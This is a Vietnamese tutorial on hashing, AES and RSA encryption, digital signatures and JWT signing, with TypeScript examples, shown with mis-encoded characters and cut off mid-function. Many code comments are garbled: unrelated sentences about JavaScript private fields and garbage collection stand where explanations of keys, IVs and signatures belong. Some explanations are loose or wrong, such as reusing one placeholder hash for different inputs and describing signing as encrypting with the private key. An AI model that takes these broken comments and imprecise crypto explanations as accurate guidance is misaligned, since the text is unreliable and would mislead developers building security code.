| **Key Required?**  | ‚ùå KH√îNG (salt optional)      | ‚úÖ C√ì (symmetric/asymmetric)        | ‚úÖ C√ì (private key sign, public verify) |
| **Use Cases**      | Password storage, checksums   | Data encryption, HTTPS              | JWT tokens, API authentication          |
| **Algorithms**     | bcrypt, SHA-256, MD5 (legacy) | AES, RSA, ChaCha20                  | RSA, ECDSA, EdDSA                       |
| **Performance**    | Slow (bcrypt: 10 rounds)      | Fast (AES: hardware accelerated)    | Medium (RSA slower than ECDSA)          |

---

#### **üîç C∆° Ch·∫ø Ho·∫°t ƒê·ªông Chi Ti·∫øt**

Tr∆∞·ªõc khi ƒëi v√†o code, h√£y hi·ªÉu r√µ **C∆† CH·∫æ** ho·∫°t ƒë·ªông c·ªßa t·ª´ng lo·∫°i ƒë·ªÉ bi·∫øt **KHI N√ÄO** d√πng **C√ÅI G√å**.

---

#### **üîê A. HASHING - H√†m BƒÉm M·ªôt Chi·ªÅu**

**üìå C∆° Ch·∫ø Ho·∫°t ƒê·ªông:**

```
INPUT (b·∫•t k·ª≥ ƒë·ªô d√†i) ‚Üí HASH FUNCTION ‚Üí OUTPUT (fixed length)

"password123"     ‚Üí  bcrypt  ‚Üí  "$2b$10$N9qo8uLO..."  (60 chars)
"myfile.pdf"      ‚Üí  SHA-256 ‚Üí  "e3b0c44298fc1c..." (64 hex chars)
"Hello World"     ‚Üí  SHA-256 ‚Üí  "a591a6d40bf420..." (64 hex chars)
```

**üîë ƒê·∫∑c ƒêi·ªÉm Quan Tr·ªçng:**

1. **One-Way (M·ªôt chi·ªÅu)**:

   - ‚úÖ C√≥ th·ªÉ: Password ‚Üí Hash
   - ‚ùå KH√îNG th·ªÉ: Hash ‚Üí Password
   - L√Ω do: Hash function lo·∫°i b·ªè th√¥ng tin (many-to-one mapping)

2. **Deterministic (C·ªë ƒë·ªãnh)**:

   ```typescript
   hash('password123') === hash('password123'); // ‚úÖ Lu√¥n gi·ªëng nhau
   ```

3. **Avalanche Effect (Hi·ªáu ·ª©ng tuy·∫øt l·ªü)**:

   ```typescript
   hash("password123")  ‚Üí "e3b0c44298fc1c..."
   hash("password124")  ‚Üí "92cf3b8ec0a8d7..."  // Ho√†n to√†n kh√°c!
   // Ch·ªâ thay ƒë·ªïi 1 k√Ω t·ª± ‚Üí hash ho√†n to√†n kh√°c
   ```

4. **Fixed Output Length (ƒê·ªô d√†i c·ªë ƒë·ªãnh)**:
   ```typescript
   hash("Hi")           ‚Üí 64 hex chars (SHA-256)
   hash("Very long...") ‚Üí 64 hex chars (SHA-256)
   // Input b·∫•t k·ª≥ ‚Üí output lu√¥n 64 chars
   ```

**üéØ T·∫°i Sao D√πng cho Passwords?**

```typescript
// ‚ùå V·∫§N ƒê·ªÄ: L∆∞u plaintext password
Database: { email: "user@example.com", password: "mypassword123" }
// N·∫øu hacker hack database ‚Üí bi·∫øt ngay password!

// ‚úÖ GI·∫¢I PH√ÅP: Hash password
Database: { email: "user@example.com", password: "$2b$10$N9qo8uLO..." }
// Hacker ch·ªâ th·∫•y hash, KH√îNG th·ªÉ reverse v·ªÅ password!

 // Ch√∫ gi·∫£i: KHI LOGIN:
const userInput = "mypassword123";
const storedHash = "$2b$10$N9qo8uLO...";

// So s√°nh: hash(userInput) === storedHash?
const isValid = bcrypt.compare(userInput, storedHash);  // ‚úÖ true n·∫øu ƒë√∫ng
```

**üí° Salt - NgƒÉn Rainbow Table Attack:**

```typescript
// ‚ùå KH√îNG D√ôNG SALT:
hash("password123") ‚Üí "e3b0c44298fc1c..."  // Lu√¥n gi·ªëng nhau
// Hacker t·∫°o Rainbow Table (b·∫£ng hash s·∫µn c·ªßa tri·ªáu passwords ph·ªï bi·∫øn)
// Tra ng∆∞·ª£c: "e3b0c44298fc1c..." ‚Üí "password123"  ‚úÖ T√¨m ƒë∆∞·ª£c!

// ‚úÖ D√ôNG SALT:
hash("password123" + "randomSalt1") ‚Üí "$2b$10$abc..."
hash("password123" + "randomSalt2") ‚Üí "$2b$10$xyz..."
// M·ªói user c√≥ salt kh√°c nhau ‚Üí c√πng password c≈©ng kh√°c hash
// Rainbow Table KH√îNG d√πng ƒë∆∞·ª£c! (v√¨ ph·∫£i t·∫°o b·∫£ng cho m·ªói salt)
```

---

#### **üîê B. ENCRYPTION - M√£ H√≥a Hai Chi·ªÅu**

C√≥ 2 lo·∫°i: **Symmetric** (ƒê·ªëi x·ª©ng) v√† **Asymmetric** (B·∫•t ƒë·ªëi x·ª©ng).

---

#### **üîê B.1. SYMMETRIC ENCRYPTION - M√£ H√≥a ƒê·ªëi X·ª©ng (1 Key)**

**üìå C∆° Ch·∫ø Ho·∫°t ƒê·ªông:**

```
PLAINTEXT + KEY ‚Üí [ENCRYPT] ‚Üí CIPHERTEXT
CIPHERTEXT + KEY ‚Üí [DECRYPT] ‚Üí PLAINTEXT

V√≠ d·ª•:
"Hello World" + key123 ‚Üí [AES Encrypt] ‚Üí "6Kq8z3Xp..."
"6Kq8z3Xp..." + key123 ‚Üí [AES Decrypt] ‚Üí "Hello World"
```

**üîë ƒê·∫∑c ƒêi·ªÉm:**

- **1 key duy nh·∫•t**: D√πng cho c·∫£ encrypt V√Ä decrypt
- **Fast**: AES-256 r·∫•t nhanh (hardware accelerated)
- **Problem**: L√†m sao g·ª≠i key an to√†n cho receiver?

**üéØ V√≠ D·ª• Th·ª±c T·∫ø - Alice g·ª≠i message cho Bob:**

```typescript
 // Ch√∫ gi·∫£i: ALICE (Sender):
const message = 'Meet me at 3pm';
const secretKey = 'shared-secret-key-123'; // ‚ö†Ô∏è Alice v√† Bob ƒë·ªÅu bi·∫øt key n√†y

const encrypted = AES.encrypt(message, secretKey); // Ch√∫ gi·∫£i: "6Kq8z3Xp..."
 // Ch√∫ gi·∫£i: Alice g·ª≠i encrypted message cho Bob

 // Ch√∫ gi·∫£i: BOB (Receiver):
const received = '6Kq8z3Xp...';
const secretKey = 'shared-secret-key-123'; // ‚ö†Ô∏è Bob ph·∫£i c√≥ C√ôNG key

const decrypted = AES.decrypt(received, secretKey); // Ch√∫ gi·∫£i: "Meet me at 3pm"
console.log(decrypted); // ‚úÖ Bob ƒë·ªçc ƒë∆∞·ª£c message
```

**‚ö†Ô∏è V·∫§N ƒê·ªÄ: Key Distribution Problem**

```
Alice v√† Bob c√°ch nhau 1000km, l√†m sao chia s·∫ª secretKey an to√†n?
- G·ª≠i qua email? ‚ùå Email c√≥ th·ªÉ b·ªã intercept
- G·ª≠i qua SMS? ‚ùå SMS kh√¥ng m√£ h√≥a
- N√≥i ƒëi·ªán tho·∫°i? ‚ùå ƒêi·ªán tho·∫°i c√≥ th·ªÉ b·ªã nghe l√©n

‚Üí Gi·∫£i ph√°p: D√πng ASYMMETRIC ENCRYPTION ƒë·ªÉ trao ƒë·ªïi symmetric key!
```

**üéØ Use Cases:**

- **Database Encryption**: Encrypt PII (email, phone, SSN)
- **File Encryption**: Encrypt files tr∆∞·ªõc khi upload cloud
- **HTTPS Data**: Sau khi handshake, d√πng AES encrypt data
- **Disk Encryption**: BitLocker, FileVault d√πng AES

**üí° T·∫°i Sao HTTPS D√πng AES (Kh√¥ng D√πng RSA)?**

```
AES-256:  Encrypt 1GB file trong ~1 gi√¢y
RSA-2048: Encrypt 1GB file trong ~10 ph√∫t!

‚Üí HTTPS flow:
1. Handshake: D√πng RSA trao ƒë·ªïi AES key (ch·ªâ ~32 bytes)
2. Data Transfer: D√πng AES encrypt data (nhanh!)
```

---

#### **üîê B.2. ASYMMETRIC ENCRYPTION - M√£ H√≥a B·∫•t ƒê·ªëi X·ª©ng (2 Keys)**

**üìå C∆° Ch·∫ø Ho·∫°t ƒê·ªông:**

```
2 KEYS: Public Key (c√¥ng khai) + Private Key (b√≠ m·∫≠t)

ENCRYPT v·ªõi PUBLIC KEY ‚Üí Decrypt v·ªõi PRIVATE KEY
PLAINTEXT + Public Key  ‚Üí [ENCRYPT] ‚Üí CIPHERTEXT
CIPHERTEXT + Private Key ‚Üí [DECRYPT] ‚Üí PLAINTEXT
```

**üîë ƒê·∫∑c ƒêi·ªÉm:**

- **2 keys kh√°c nhau**: Public (share freely) + Private (keep secret)
- **Math Magic**: D·ª±a tr√™n s·ªë h·ªçc (factorization, discrete logarithm)
- **Slow**: RSA ch·∫≠m h∆°n AES 10-100x

**üéØ V√≠ D·ª• Th·ª±c T·∫ø - Alice g·ª≠i message cho Bob:**

```typescript
 // Ch√∫ gi·∫£i: BOB t·∫°o key pair:
const bobKeys = generateRSAKeyPair();
 // Ch√∫ gi·∫£i: bobKeys.publicKey  = "-----BEGIN PUBLIC KEY-----..."  (Share freely)
 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.

 // Ch√∫ gi·∫£i: Bob g·ª≠i PUBLIC KEY cho Alice (qua email, website, anywhere)
// ‚ö†Ô∏è Public key KH√îNG s·ª£ b·ªã l·ªô! Ai c≈©ng bi·∫øt ƒë∆∞·ª£c!

 // Ch√∫ gi·∫£i: ALICE (Sender):
const message = 'Meet me at 3pm';
const encrypted = RSA.encrypt(message, bobKeys.publicKey); // D√πng Bob's PUBLIC KEY
 // Ch√∫ gi·∫£i: encrypted = "f8Kq3z..."

// ‚ö†Ô∏è Ch·ªâ Bob m·ªõi decrypt ƒë∆∞·ª£c (v√¨ ch·ªâ Bob c√≥ PRIVATE KEY)
// Alice KH√îNG th·ªÉ decrypt (d√π Alice l√† ng∆∞·ªùi encrypt!)

 // Ch√∫ gi·∫£i: BOB (Receiver):
const decrypted = RSA.decrypt(encrypted, bobKeys.privateKey); // D√πng Bob's PRIVATE KEY
console.log(decrypted); // Ch√∫ gi·∫£i: "Meet me at 3pm" ‚úÖ
```

**üí° Gi·∫£i Quy·∫øt Key Distribution Problem:**

```
Alice mu·ªën g·ª≠i message cho Bob:

C√ÅCH C≈® (Symmetric):
1. Alice v√† Bob ph·∫£i g·∫∑p nhau ƒë·ªÉ trao ƒë·ªïi secret key  ‚ùå Kh√¥ng ti·ªán
2. Ho·∫∑c g·ª≠i key qua k√™nh kh√¥ng an to√†n  ‚ùå Nguy hi·ªÉm

C√ÅCH M·ªöI (Asymmetric):
1. Bob t·∫°o key pair (public + private)
2. Bob share public key l√™n website/email (KH√îNG s·ª£ l·ªô!)
3. Alice l·∫•y Bob's public key
4. Alice encrypt message v·ªõi Bob's public key
5. G·ª≠i encrypted message cho Bob
6. Bob decrypt v·ªõi private key (ch·ªâ Bob c√≥!)

‚úÖ KH√îNG c·∫ßn g·∫∑p nhau!
‚úÖ KH√îNG c·∫ßn trao ƒë·ªïi secret key!
‚úÖ Public key b·ªã l·ªô c≈©ng KH√îNG sao!
```

**üéØ Use Cases:**

- **HTTPS Handshake**: Server g·ª≠i public key, client encrypt AES key
- **SSH Authentication**: Client c√≥ private key, server c√≥ public key
- **PGP Email**: Encrypt email v·ªõi recipient's public key
- **Digital Signatures**: Sign v·ªõi private key, verify v·ªõi public key (ƒë·∫£o ng∆∞·ª£c!)

**üîê Public Key vs Private Key - Ai D√πng C√°i G√¨?**

```typescript
// ENCRYPTION (M√£ h√≥a - Protect Confidentiality):
Sender   encrypt v·ªõi RECEIVER's PUBLIC KEY
Receiver decrypt v·ªõi RECEIVER's PRIVATE KEY

V√≠ d·ª•: Alice g·ª≠i message cho Bob
Alice:  encrypt(message, Bob's PUBLIC KEY)   ‚Üí ciphertext
Bob:    decrypt(ciphertext, Bob's PRIVATE KEY) ‚Üí message

// DIGITAL SIGNATURE (Ch·ªØ k√Ω s·ªë - Prove Authenticity):
Signer  sign v·ªõi SIGNER's PRIVATE KEY
Verifier verify v·ªõi SIGNER's PUBLIC KEY

V√≠ d·ª•: Alice k√Ω document
Alice:  sign(document, Alice's PRIVATE KEY)   ‚Üí signature
Bob:    verify(document, signature, Alice's PUBLIC KEY) ‚Üí ‚úÖ valid
```

---

#### **üîê C. DIGITAL SIGNATURE - Ch·ªØ K√Ω S·ªë**

**üìå C∆° Ch·∫ø Ho·∫°t ƒê·ªông:**

```
SIGN (K√Ω):
1. Hash document v·ªõi SHA-256 ‚Üí hash
2. Encrypt hash v·ªõi PRIVATE KEY ‚Üí signature
3. G·ª≠i document + signature

VERIFY (X√°c th·ª±c):
1. Hash received document ‚Üí hash1
2. Decrypt signature v·ªõi PUBLIC KEY ‚Üí hash2
3. Compare hash1 === hash2 ?
   - ‚úÖ Match ‚Üí Document valid, kh√¥ng b·ªã tamper
   - ‚ùå Not match ‚Üí Document b·ªã thay ƒë·ªïi ho·∫∑c signature gi·∫£
```

**üîë ƒê·∫∑c ƒêi·ªÉm:**

- **Prove Authenticity**: Ch·ª©ng minh document t·ª´ ƒë√∫ng ng∆∞·ªùi (ch·ªâ h·ªç c√≥ private key)
- **Prove Integrity**: Ch·ª©ng minh document kh√¥ng b·ªã thay ƒë·ªïi (hash kh·ªõp)
- **Non-repudiation**: Signer kh√¥ng th·ªÉ ch·ªëi b·ªè ƒë√£ k√Ω (v√¨ ch·ªâ h·ªç c√≥ private key)

**üéØ V√≠ D·ª• Th·ª±c T·∫ø - Alice K√Ω Contract:**

```typescript
 // Ch√∫ gi·∫£i: ALICE t·∫°o key pair:
const aliceKeys = generateRSAKeyPair();
 // Ch√∫ gi·∫£i: aliceKeys.publicKey  = "-----BEGIN PUBLIC KEY-----..."  (Share)
 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.

// ALICE K√ù CONTRACT:
const contract = 'I agree to pay $10000 to Bob';

 // Ch√∫ gi·∫£i: B∆∞·ªõc 1: Hash contract
const hash = SHA256(contract); // Ch√∫ gi·∫£i: "e3b0c44298fc1c..."

 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
const signature = RSA.encrypt(hash, aliceKeys.privateKey); // Ch√∫ gi·∫£i: "f8Kq3z..."

 // Ch√∫ gi·∫£i: Alice g·ª≠i cho Bob: contract + signature + Alice's public key

 // Ch√∫ gi·∫£i: BOB VERIFY SIGNATURE:
const receivedContract = 'I agree to pay $10000 to Bob';
const receivedSignature = 'f8Kq3z...';
const alicePublicKey = '-----BEGIN PUBLIC KEY-----...';

 // Ch√∫ gi·∫£i: B∆∞·ªõc 1: Hash received contract
const hash1 = SHA256(receivedContract); // Ch√∫ gi·∫£i: "e3b0c44298fc1c..."

 // Ch√∫ gi·∫£i: B∆∞·ªõc 2: Decrypt signature v·ªõi PUBLIC KEY
const hash2 = RSA.decrypt(receivedSignature, alicePublicKey); // Ch√∫ gi·∫£i: "e3b0c44298fc1c..."

 // Ch√∫ gi·∫£i: B∆∞·ªõc 3: Compare
if (hash1 === hash2) {
  console.log('‚úÖ Signature valid!');
  console.log('‚úÖ Contract t·ª´ Alice (v√¨ ch·ªâ Alice c√≥ private key)');
  console.log('‚úÖ Contract kh√¥ng b·ªã thay ƒë·ªïi (v√¨ hash kh·ªõp)');
} else {
  console.log('‚ùå Signature invalid!');
  console.log('‚ùå Contract b·ªã tamper ho·∫∑c signature gi·∫£!');
}
```

**üí° T·∫°i Sao KH√îNG Encrypt To√†n B·ªô Document?**

```
RSA SLOW:
- Sign to√†n b·ªô contract (10 pages) ‚Üí 10 gi√¢y
- Sign hash c·ªßa contract (64 chars)  ‚Üí 0.01 gi√¢y

Hash UNIQUE:
- 2 documents kh√°c nhau ‚Üí 2 hashes kh√°c nhau
- 1 document thay ƒë·ªïi 1 k√Ω t·ª± ‚Üí hash ho√†n to√†n kh√°c
‚Üí Verify hash = verify to√†n b·ªô document!
```

**üéØ Use Cases:**

- **JWT Tokens**: Server sign JWT v·ªõi private key, client verify v·ªõi public key
- **Code Signing**: Software developers sign apps (macOS, Windows)
- **SSL Certificates**: Certificate Authority (CA) sign certificates
- **Blockchain**: Sign transactions v·ªõi private key
- **Email (PGP)**: Sign emails ƒë·ªÉ prove authenticity

**üîê Digital Signature vs Encryption - Kh√°c Nhau Th·∫ø N√†o?**

```typescript
// ENCRYPTION (M√£ h√≥a):
M·ª•c ƒë√≠ch: Protect CONFIDENTIALITY (b·∫£o m·∫≠t)
Encrypt v·ªõi: RECEIVER's PUBLIC KEY
Decrypt v·ªõi: RECEIVER's PRIVATE KEY
Result: Ch·ªâ receiver ƒë·ªçc ƒë∆∞·ª£c message

V√≠ d·ª•: Alice g·ª≠i secret message cho Bob
Alice:  encrypt(message, Bob's PUBLIC)    ‚Üí Bob decrypt v·ªõi Bob's PRIVATE
        ‚Üë D√πng Bob's keys!

// DIGITAL SIGNATURE (Ch·ªØ k√Ω s·ªë):
M·ª•c ƒë√≠ch: Prove AUTHENTICITY & INTEGRITY (x√°c th·ª±c & to√†n v·∫πn)
Sign v·ªõi: SIGNER's PRIVATE KEY
Verify v·ªõi: SIGNER's PUBLIC KEY
Result: M·ªçi ng∆∞·ªùi verify ƒë∆∞·ª£c message t·ª´ signer

V√≠ d·ª•: Alice k√Ω contract
Alice:  sign(contract, Alice's PRIVATE)   ‚Üí Bob verify v·ªõi Alice's PUBLIC
        ‚Üë D√πng Alice's keys!
```

**üéØ JWT Example - K·∫øt H·ª£p C·∫£ Hai:**

```typescript
 // Ch√∫ gi·∫£i: SERVER (Sign JWT):
const payload = { userId: '123', role: 'admin' };
const privateKey = '-----BEGIN PRIVATE KEY-----...';

 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
const token = jwt.sign(payload, privateKey, { algorithm: 'RS256' });
 // Thu gom r√°c t·ª± ƒë·ªông: runtime ƒë√°nh d·∫•u v√† qu√©t c√°c object kh√¥ng c√≤n truy c·∫≠p ƒë·ªÉ gi·∫£i ph√≥ng b·ªô nh·ªõ.

 // Ch√∫ gi·∫£i: CLIENT/API (Verify JWT):
const publicKey = '-----BEGIN PUBLIC KEY-----...';

try {
  const verified = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
  console.log('‚úÖ Token valid:', verified);
  // ‚úÖ Token t·ª´ server (v√¨ ch·ªâ server c√≥ private key)
  // ‚úÖ Payload kh√¥ng b·ªã thay ƒë·ªïi (v√¨ signature valid)
} catch (error) {
  console.log('‚ùå Token invalid:', error.message);
  // ‚ùå Token b·ªã tamper ho·∫∑c signature gi·∫£
}
```

**üí° T·∫°i Sao JWT D√πng RS256 (Kh√¥ng D√πng HS256)?**

```typescript
 // Ch√∫ gi·∫£i: HS256 (HMAC with SHA-256):
- Symmetric: 1 secret key (server gi·ªØ)
- Sign: HMAC(payload, secret)
- Verify: HMAC(payload, secret)
‚ö†Ô∏è V·∫§N ƒê·ªÄ: Client KH√îNG verify ƒë∆∞·ª£c (kh√¥ng c√≥ secret key)
‚ö†Ô∏è N·∫øu client c√≥ secret ‚Üí client c√≥ th·ªÉ forge tokens!

 // Ch√∫ gi·∫£i: RS256 (RSA with SHA-256):
- Asymmetric: Private key (server) + Public key (share)
- Sign: RSA(hash(payload), privateKey)
- Verify: RSA(signature, publicKey)
‚úÖ Client verify ƒë∆∞·ª£c (c√≥ public key)
‚úÖ Client KH√îNG th·ªÉ forge tokens (kh√¥ng c√≥ private key)
‚úÖ Microservices verify ƒë∆∞·ª£c (share public key)
```

---

#### **üìö T√≥m T·∫Øt C∆° Ch·∫ø:**

| Lo·∫°i                   | Keys              | Operation                     | Use Case                        |
| ---------------------- | ----------------- | ----------------------------- | ------------------------------- |
| **Hashing**            | ‚ùå No key         | Input ‚Üí Hash (one-way)        | Passwords, checksums            |
| **Symmetric Encrypt**  | 1 key (shared)    | Encrypt/Decrypt (same key)    | Database encryption, HTTPS data |
| **Asymmetric Encrypt** | 2 keys (pub+priv) | Encrypt (pub), Decrypt (priv) | HTTPS handshake, PGP email      |
| **Digital Signature**  | 2 keys (pub+priv) | Sign (priv), Verify (pub)     | JWT, code signing, blockchain   |

---

#### **1Ô∏è‚É£ HASHING - One-Way Function (H√†m M·ªôt Chi·ªÅu)**

**üîë ƒê·∫∑c ƒêi·ªÉm:**

- **One-way**: Input ‚Üí Hash, KH√îNG th·ªÉ Hash ‚Üí Input
- **Deterministic**: C√πng input ‚Üí c√πng hash
- **Fixed length**: SHA-256 lu√¥n 64 hex chars (256 bits)
- **Avalanche effect**: Thay ƒë·ªïi 1 bit input ‚Üí ho√†n to√†n kh√°c hash

**üìå Use Cases:**

1. **Password Storage**: Never store plaintext passwords
2. **Data Integrity**: Verify files kh√¥ng b·ªã thay ƒë·ªïi (checksums)
3. **Unique Identifiers**: Generate tokens, session IDs
4. **Blockchain**: Bitcoin s·ª≠ d·ª•ng SHA-256

---

**üîê 1.1. Password Hashing v·ªõi bcrypt**

```typescript
import bcrypt from 'bcrypt';

 // Ch√∫ gi·∫£i: =====================================
 // Ch√∫ gi·∫£i: PASSWORD HASHING WITH BCRYPT
 // Ch√∫ gi·∫£i: =====================================

// üîπ REGISTER - Hash password khi user ƒëƒÉng k√Ω
async function registerUser(email: string, password: string) {
  // Salt rounds = ƒë·ªô ph·ª©c t·∫°p (10 = 2^10 = 1024 iterations)
  // C√†ng cao c√†ng secure nh∆∞ng c√†ng ch·∫≠m
  const saltRounds = 10;

  // bcrypt t·ª± ƒë·ªông generate salt v√† combine v·ªõi hash
  const hashedPassword = await bcrypt.hash(password, saltRounds);

  // L∆∞u v√†o database
  await db.users.create({
    email,
    password: hashedPassword, // Ch√∫ gi·∫£i: VD: $2b$10$Xu... (60 chars)
  });

  console.log('Original:', password); // Ch√∫ gi·∫£i: "MySecurePass123"
  console.log('Hashed:', hashedPassword); // Ch√∫ gi·∫£i: "$2b$10$Xu4K..."
  // ‚ö†Ô∏è Kh√¥ng th·ªÉ reverse t·ª´ hash v·ªÅ password!
}

// üîπ LOGIN - Verify password khi user ƒëƒÉng nh·∫≠p
async function loginUser(email: string, password: string) {
 // Ch√∫ gi·∫£i: L·∫•y user t·ª´ database
  const user = await db.users.findByEmail(email);

  if (!user) {
    throw new Error('User not found');
  }

  // So s√°nh password v·ªõi hash (bcrypt.compare t·ª± extract salt)
  const isValid = await bcrypt.compare(password, user.password);

  if (!isValid) {
    throw new Error('Invalid password');
  }

  // Generate JWT token n·∫øu password ƒë√∫ng
  const token = generateJWT(user.id);
  return { user, token };
}

// üîπ CHANGE PASSWORD - Hash l·∫°i khi user ƒë·ªïi m·∫≠t kh·∫©u
async function changePassword(
  userId: string,
  oldPassword: string,
  newPassword: string
) {
  const user = await db.users.findById(userId);

 // Ch√∫ gi·∫£i: Verify old password
  const isValid = await bcrypt.compare(oldPassword, user.password);
  if (!isValid) {
    throw new Error('Old password is incorrect');
  }

 // Ch√∫ gi·∫£i: Hash new password
  const newHashedPassword = await bcrypt.hash(newPassword, 10);

 // Ch√∫ gi·∫£i: Update database
  await db.users.update(userId, {
    password: newHashedPassword,
    passwordChangedAt: new Date(),
  });
}
```

**üí° Gi·∫£i Th√≠ch:**

- **bcrypt format**: `$2b$10$salt(22 chars)hash(31 chars)` (total 60 chars)
  - `$2b$` = bcrypt algorithm version
  - `10` = salt rounds (cost factor)
  - `salt` = random salt (22 chars)
  - `hash` = actual hash (31 chars)
- **Salt**: Random value th√™m v√†o password tr∆∞·ªõc khi hash
  - M·ª•c ƒë√≠ch: NgƒÉn rainbow table attacks
  - M·ªói user c√≥ salt kh√°c nhau ‚Üí c√πng password c≈©ng kh√°c hash
- **bcrypt.compare()**: T·ª± ƒë·ªông extract salt t·ª´ hash v√† compare

---

**üîê 1.2. Data Integrity v·ªõi SHA-256**

```typescript
import crypto from 'crypto';

 // Ch√∫ gi·∫£i: =====================================
 // Ch√∫ gi·∫£i: SHA-256 FOR DATA INTEGRITY
 // Ch√∫ gi·∫£i: =====================================

// üîπ FILE CHECKSUM - Verify file kh√¥ng b·ªã thay ƒë·ªïi
function generateFileChecksum(fileContent: Buffer): string {
  return crypto.createHash('sha256').update(fileContent).digest('hex'); // Ch√∫ gi·∫£i: 64 hex chars (256 bits)
}

 // Ch√∫ gi·∫£i: Example: Download file verification
async function downloadAndVerify(url: string, expectedChecksum: string) {
  const fileContent = await downloadFile(url);
  const actualChecksum = generateFileChecksum(fileContent);

  if (actualChecksum !== expectedChecksum) {
    throw new Error('File corrupted! Checksum mismatch');
  }

  console.log('‚úÖ File verified successfully');
  return fileContent;
}

 // Ch√∫ gi·∫£i: üîπ GENERATE UNIQUE TOKEN - Session ID, API keys
function generateSessionToken(userId: string): string {
  const timestamp = Date.now().toString();
  const random = crypto.randomBytes(16).toString('hex');

  // Hash combination ƒë·ªÉ t·∫°o unique token
  return crypto
    .createHash('sha256')
    .update(`${userId}:${timestamp}:${random}`)
    .digest('hex');
}

 // Ch√∫ gi·∫£i: üîπ HMAC - Hash with secret key (for API signatures)
function generateHMAC(data: string, secretKey: string): string {
  return crypto.createHmac('sha256', secretKey).update(data).digest('hex');
}

 // Ch√∫ gi·∫£i: Example: Verify webhook payload t·ª´ third-party service
function verifyWebhook(
  payload: string,
  signature: string,
  secret: string
): boolean {
  const expectedSignature = generateHMAC(payload, secret);
  return crypto.timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expectedSignature)
  );
}
```

**üí° Gi·∫£i Th√≠ch:**

- **SHA-256**: Cryptographic hash function (256-bit output)
  - Kh√¥ng d√πng cho password (qu√° nhanh ‚Üí vulnerable to brute-force)
  - D√πng cho checksums, data integrity
- **HMAC** (Hash-based Message Authentication Code):
  - SHA-256 + secret key
  - Verify c·∫£ integrity V√Ä authenticity
  - D√πng trong webhook signatures, API authentication

---

#### **2Ô∏è‚É£ ENCRYPTION - Two-Way Function (M√£ H√≥a Hai Chi·ªÅu)**

> **ÔøΩ Xem l·∫°i ph·∫ßn [üîê B. ENCRYPTION](#-b-encryption---m√£-h√≥a-hai-chi·ªÅu) ·ªü tr√™n ƒë·ªÉ hi·ªÉu r√µ c∆° ch·∫ø ho·∫°t ƒë·ªông c·ªßa Symmetric (1 key) vs Asymmetric (2 keys), Public/Private Key, v√† Key Distribution Problem!**

**ÔøΩüîë ƒê·∫∑c ƒêi·ªÉm:**

- **Two-way**: Plaintext ‚áÑ Ciphertext (encrypt ‚Üî decrypt)
- **Requires key**: Symmetric (1 key) ho·∫∑c Asymmetric (2 keys)
- **Protects confidentiality**: Gi·∫•u d·ªØ li·ªáu kh·ªèi unauthorized access

**üìå Use Cases:**

1. **HTTPS/TLS**: Encrypt network traffic
2. **Database Encryption**: Protect sensitive PII (emails, phone numbers)
3. **File Encryption**: Encrypt files tr∆∞·ªõc khi upload cloud
4. **API Keys**: Encrypt secrets trong config

**üîç Nh·∫Øc L·∫°i C∆° Ch·∫ø:**

```typescript
 // Ch√∫ gi·∫£i: SYMMETRIC (AES): 1 key cho c·∫£ encrypt & decrypt
const key = 'shared-secret-key';
const encrypted = AES.encrypt('data', key); // Ch√∫ gi·∫£i: Encrypt v·ªõi key
const decrypted = AES.decrypt(encrypted, key); // Decrypt v·ªõi C√ôNG key
// ‚ö†Ô∏è V·∫•n ƒë·ªÅ: L√†m sao g·ª≠i key an to√†n?

 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
const { publicKey, privateKey } = generateKeys();
const encrypted = RSA.encrypt('data', publicKey); // Ch√∫ gi·∫£i: Encrypt v·ªõi PUBLIC key
const decrypted = RSA.decrypt(encrypted, privateKey); // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
// ‚úÖ Gi·∫£i ph√°p: Public key share tho·∫£i m√°i, ch·ªâ private key gi·ªØ b√≠ m·∫≠t!
```

---

**üîê 2.1. Symmetric Encryption - AES (Advanced Encryption Standard)**

```typescript
import crypto from 'crypto';

 // Ch√∫ gi·∫£i: =====================================
 // Thu gom r√°c t·ª± ƒë·ªông: runtime ƒë√°nh d·∫•u v√† qu√©t c√°c object kh√¥ng c√≤n truy c·∫≠p ƒë·ªÉ gi·∫£i ph√≥ng b·ªô nh·ªõ.
 // Ch√∫ gi·∫£i: =====================================

interface EncryptedData {
  iv: string; // Thu gom r√°c t·ª± ƒë·ªông: runtime ƒë√°nh d·∫•u v√† qu√©t c√°c object kh√¥ng c√≤n truy c·∫≠p ƒë·ªÉ gi·∫£i ph√≥ng b·ªô nh·ªõ.
  encryptedText: string; // Ch√∫ gi·∫£i: Ciphertext
  authTag: string; // Ch√∫ gi·∫£i: Authentication Tag (16 bytes)
}

// üîπ ENCRYPT - M√£ h√≥a d·ªØ li·ªáu v·ªõi AES-256-GCM
function encryptAES(plaintext: string, secretKey: string): EncryptedData {
 // Ch√∫ gi·∫£i: Generate random IV (Initialization Vector)
  // ‚ö†Ô∏è PH·∫¢I random m·ªói l·∫ßn encrypt, KH√îNG reuse!
  const iv = crypto.randomBytes(12);

 // Thu gom r√°c t·ª± ƒë·ªông: runtime ƒë√°nh d·∫•u v√† qu√©t c√°c object kh√¥ng c√≤n truy c·∫≠p ƒë·ªÉ gi·∫£i ph√≥ng b·ªô nh·ªõ.
